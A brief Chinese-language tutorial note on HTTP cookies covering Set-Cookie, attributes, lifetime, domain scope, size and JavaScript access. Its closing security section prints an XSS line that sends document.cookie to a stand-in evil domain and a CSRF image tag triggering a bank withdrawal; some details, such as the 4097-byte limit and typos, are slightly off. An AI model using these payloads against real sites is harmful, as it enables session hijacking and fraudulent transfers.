
## 目录
- 创建
- 生命周期
- 

## 创建Cookie
当服务器收到HTTP请求时，服务器可以在响应头里面添加一个Set-Cookie选项。
浏览器收到响应后通常会保存下Cookie，
之后对该服务器每一次请求中都通过Cookie请求头部将Cookie信息发送给服务器。
另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

服务器使用Set-Cookie响应头部向用户代理（一般是浏览器）发送Cookie信息。一个简单的Cookie可能像这样：
```javascript
  Set-Cookie: <cookie名>=<cookie值>
  response.setHeader('Set-Cookie', ['type=ninja','username=123qad'， 'language=javascript']);
```

## 组成
- Name
- Value
- Domain
- Path
- Expires/ Max-Age     过期时间
- Size
- Http
- Secure            是否加密,标记为Secure 只会通过 htpps 协议传输， http 是不能设置的
- SameSite
[组成](./cookie.png)


## 生命周期

默认是浏览器关闭就清掉， 一般会设置  指定过期时间（Expires）或者有效期（Max-Age）
需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie也会被保留下来，就好像浏览器从来没有关闭一样。
```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;

```
## 作用域
Domain (域名)和 Path 标识定义了Cookie的作用域：即Cookie应该发送给哪些URL。

Cookie 的Domain 属性可以设置 Cookie 发送哪些 url，默认是在当前域名下，但有时候我们可能几个站点想共享Cookie 信息
比方 qq空间(qq.tentxun.com)登陆了，我想点进 qq 邮箱(mail.tenxun.com)， 那要是再登陆一次，用户爸爸肯定受不了，所以通过设置
 cookie 的 domain 为 ".tenxun.com",从 qq空间点击链接 进入 qq 邮箱， qq邮箱 通过 cookie 信息，获取用户信息，就可以不用再次登陆了


如果设置 Domain=mozilla.org，则Cookie也包含在子域名中（如developer.mozilla.org）。


## 存储大小

4097个字节， 多了浏览器会默默删掉

## javascript 访问 Cookie
```
 var cookie = document.cookie;
 document.cookie = "username=tt";

```


## 安全问题

(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;

<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">



